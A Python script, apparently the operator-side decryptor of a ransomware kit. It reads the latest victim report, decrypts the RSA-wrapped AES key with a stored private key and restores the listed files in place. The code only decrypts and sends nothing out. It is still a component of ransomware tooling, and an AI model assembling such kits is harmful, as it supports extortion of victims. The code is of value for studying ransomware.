import os
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

REPORTS_DIR = "server/reports"
PRIVATE_KEY_PATH = "server/keys/private.pem"

def get_latest_report_path():
    report_files = sorted(
        [f for f in os.listdir(REPORTS_DIR) if f.startswith("report_")],
        key=lambda f: os.path.getmtime(os.path.join(REPORTS_DIR, f)),
        reverse=True
    )
    if not report_files:
        raise FileNotFoundError("No report files found.")
    return os.path.join(REPORTS_DIR, report_files[0])

def extract_report_data(report_path):
    with open(report_path, 'r') as f:
        lines = f.readlines()

    encrypted_key_b64 = ""
    encrypted_files = []
    reading_files = False

    for i, line in enumerate(lines):
        line = line.strip()
        if line.startswith("Encrypted AES Key"):
            encrypted_key_b64 = lines[i + 1].strip()
        elif line == "Encrypted files:":
            reading_files = True
        elif reading_files and line:
            encrypted_files.append(line)

    if not encrypted_key_b64 or not encrypted_files:
        raise ValueError("Report is missing AES key or file paths.")

    return encrypted_key_b64, encrypted_files

def decrypt_aes_key(encrypted_key_b64):
    with open(PRIVATE_KEY_PATH, 'rb') as f:
        private_key = RSA.import_key(f.read())

    encrypted_key = base64.b64decode(encrypted_key_b64)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_key)

def decrypt_file(file_path, aes_key):
    with open(file_path, 'rb') as f:
        data = f.read()

    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]

    cipher = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file_path, 'wb') as f:
        f.write(plaintext)

    print(f"[+] Decrypted: {file_path}")

def main():
    try:
        report_path = get_latest_report_path()

        encrypted_key_b64, encrypted_files = extract_report_data(report_path)
        aes_key = decrypt_aes_key(encrypted_key_b64)

        for file_path in encrypted_files:
            if os.path.exists(file_path):
                decrypt_file(file_path, aes_key)
            else:
                print(f"[!] File not found: {file_path}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
